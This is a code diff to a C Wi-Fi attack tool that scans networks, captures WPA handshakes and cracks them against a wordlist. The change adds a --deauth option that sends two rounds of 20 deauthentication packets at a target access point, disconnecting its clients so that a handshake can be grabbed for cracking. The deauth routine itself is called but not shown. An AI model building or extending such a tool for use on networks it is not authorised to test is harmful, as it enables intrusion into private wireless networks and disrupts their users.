@@ -76,13 +76,14 @@ static void print_usage(const char *prog_name) {
     printf("  -b, --bssid MAC        Target AP MAC address (crack first found if not provided)\n");
     printf("  -w, --wordlist PATH    Path to wordlist file (required for cracking)\n");
     printf("  -c, --channel NUM      Specific channel to scan (1-14, default: all)\n");
+    printf("  -d, --deauth           Send deauthentication packets to force handshake\n");
     printf("  -s, --scan-only        Only scan for networks (no handshake capture)\n");
     printf("  -v, --version          Show version information\n");
     printf("  -h, --help             Show this help message\n");
     printf("\nExamples:\n");
     printf("  sudo %s -w /usr/share/wordlists/rockyou.txt\n", prog_name);
     printf("  sudo %s -i wlan0 -w rockyou.txt\n", prog_name);
-    printf("  sudo %s -i wlan0 -b AA:BB:CC:DD:EE:FF -w rockyou.txt\n", prog_name);
+    printf("  sudo %s -i wlan0 -b AA:BB:CC:DD:EE:FF -w rockyou.txt -d\n", prog_name);
     printf("  sudo %s -i wlan0 -s                          # Scan only\n", prog_name);
 }
 
@@ -146,6 +147,7 @@ struct options {
     int  channel;
     int  auto_detect;
     int  scan_only;
+    int  deauth;
 };
 
 static int parse_args(int argc, char *argv[], struct options *opts) {
@@ -154,21 +156,23 @@ static int parse_args(int argc, char *argv[], struct options *opts) {
     // Default values
     memset(opts, 0, sizeof(*opts));
     opts->auto_detect = 1;
-    opts->channel = 0; // 0 = all channels
+    opts->channel = 0;
     opts->scan_only = 0;
+    opts->deauth = 0;
 
     static struct option long_options[] = {
         {"interface", required_argument, 0, 'i'},
         {"bssid",     required_argument, 0, 'b'},
         {"wordlist",  required_argument, 0, 'w'},
         {"channel",   required_argument, 0, 'c'},
+        {"deauth",    no_argument,       0, 'd'},
         {"scan-only", no_argument,       0, 's'},
         {"version",   no_argument,       0, 'v'},
         {"help",      no_argument,       0, 'h'},
         {0, 0, 0, 0}
     };
 
-    while ((opt = getopt_long(argc, argv, "i:b:w:c:svh", long_options, NULL)) != -1) {
+    while ((opt = getopt_long(argc, argv, "i:b:w:c:dsvh", long_options, NULL)) != -1) {
         switch (opt) {
             case 'i':
                 strncpy(opts->interface, optarg, IFNAMSIZ - 1);
@@ -192,6 +196,9 @@ static int parse_args(int argc, char *argv[], struct options *opts) {
                     log_error("Invalid channel: %s (must be 1-14)", optarg);
                     return -1;
                 }
+                break;
+            case 'd':
+                opts->deauth = 1;
                 break;
             case 's':
                 opts->scan_only = 1;
@@ -301,6 +308,7 @@ int main(int argc, char *argv[]) {
         log_info("  Wordlist:   %s", opts.wordlist);
     }
     log_info("  Channel:    %s", opts.channel > 0 ? "specified" : "all (1-14)");
+    log_info("  Deauth:     %s", opts.deauth ? "enabled" : "disabled");
     log_info("  Mode:       %s", opts.scan_only ? "Scan only" : "Handshake capture + crack");
     printf("\n");
 
@@ -397,7 +405,25 @@ int main(int argc, char *argv[]) {
 
     // Phase 3: Capture handshake on target
     printf("\n");
-    log_info("Phase 3: Capturing handshake on target... (Press Ctrl+C to stop)");
+    log_info("Phase 3: Capturing handshake on target...");
+
+    // Send deauth packets if enabled
+    if (opts.deauth) {
+        log_info("Sending deauthentication packets to force handshake...");
+        int deauth_count = 20;  // Send 20 deauth packets
+        int sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, deauth_count);
+        log_info("Sent %d deauth packets", sent);
+
+        // Wait a moment for devices to reconnect
+        usleep(2000000); // 2 seconds
+
+        // Send another round
+        log_info("Sending more deauth packets...");
+        sent = scanner_send_deauth(&cap, scanner.target_bssid, NULL, deauth_count);
+        log_info("Sent %d deauth packets", sent);
+    }
+
+    log_info("Listening for handshake... (Press Ctrl+C to stop)");
 
     time_t capture_start = time(NULL);
     int handshake_timeout = 60; // 60 seconds to capture handshake
